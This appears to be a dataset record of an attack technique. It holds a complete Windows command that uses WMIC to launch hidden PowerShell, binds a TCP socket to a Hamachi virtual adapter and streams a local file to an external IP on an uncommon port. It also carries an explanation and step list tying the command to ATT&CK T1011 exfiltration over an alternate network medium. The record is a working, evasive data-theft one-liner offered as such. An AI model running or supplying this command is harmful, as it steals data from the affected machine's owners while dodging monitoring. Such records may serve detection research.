command: wmic process call create "powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\Users\Public\Downloads\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }"
explanation: Uses WMIC to start a hidden PowerShell that binds to a Hamachi virtual adapter and exfiltrates data via TCP on an unusual port. A third-party virtual NIC provides an alternate medium in line with T1011.
rationale_steps: Discover the Hamachi virtual NIC using WMI.
Bind the TCP client to the Hamachi interface to force that egress path.
Connect to an external server using a high port uncommon in enterprise traffic.
Stream file bytes through the virtual network medium per T1011.
Avoid any system-wide routing or adapter changes.
